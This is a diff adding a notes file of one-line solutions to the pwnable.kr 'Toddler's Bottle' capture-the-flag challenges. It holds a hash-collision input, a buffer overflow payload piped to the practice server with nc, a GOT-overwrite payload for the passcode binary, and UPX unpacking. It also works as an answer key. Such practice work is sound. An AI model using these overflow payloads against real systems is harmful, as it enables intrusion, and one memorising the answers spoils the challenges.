@@ -1,0 +1,26 @@
+TODDLER'S BOTTLE
+
+0_fd		: mommy! I think I know what a file descriptor is!!
+	$ echo "4660" | ./fd 
+
+1_collision 	: daddy! I just managed to create a hash collision :)
+	$ ./col $(printf  "\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06")
+
+2_bof		: 
+	$ (printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca" && cat ) | nc pwnable.kr 9000
+
+3_flag		: UPX...? sounds like a delivery service :)
+	$ upx -d ./flag
+	
+4_passcode	: Sorry mom.. I got confused about scanf usage :(
+	$ python2 -c 'print 0x080485d7'		#  using this address as integer input - 134514135
+	$ python2 -c 'print "A"*96 + "\x04\xa0\x04\x08" + "134514135"'  | ./passcode
+
+5_random	: Mommy, I thought libc random is unpredictable...  
+	$ random variable stores the same value everytime - eax	0x6b8b4567 (1804289383)
+	$ 1804289383 ^ 0xdeadbeef = 3039230856
+
+6_input2	: Mommy! I learned how to pass various input in Linux :)
+	$ view sol_input2.c
+
+	
